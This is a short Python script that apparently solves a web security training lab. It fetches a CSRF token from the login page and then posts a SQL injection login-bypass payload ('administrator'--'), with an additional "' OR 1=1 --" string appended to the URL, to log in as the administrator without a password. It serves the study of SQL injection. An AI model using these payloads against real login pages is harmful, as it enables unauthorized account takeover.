from lib import (
    LOGIN_CSRF_XPATH,
    SESSION,
    generate_parser,
    get_csrf_token,
    check_is_lab_solved,
)

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    print("[+] Getting the login page CSRF TOKEN")

    login_page_csrf_token = get_csrf_token(
        SESSION.get(f"{lab_url}/login").text, LOGIN_CSRF_XPATH
    )

    print(f"[+] Login Page CSRF Token: {login_page_csrf_token}")

    print("[+] Performing the login bypass")

    if (
        SESSION.post(
            f"{lab_url}/login?category=Pets' OR 1=1 --",
            data={
                "csrf": login_page_csrf_token,
                # NOTE: Login bypass SQL Injection Payload
                "username": "administrator'--",
                "password": "dummy-pass",
            },
        ).status_code
        == 200
    ):
        print("[+] Login bypassed succesfully")

    check_is_lab_solved(lab_url)
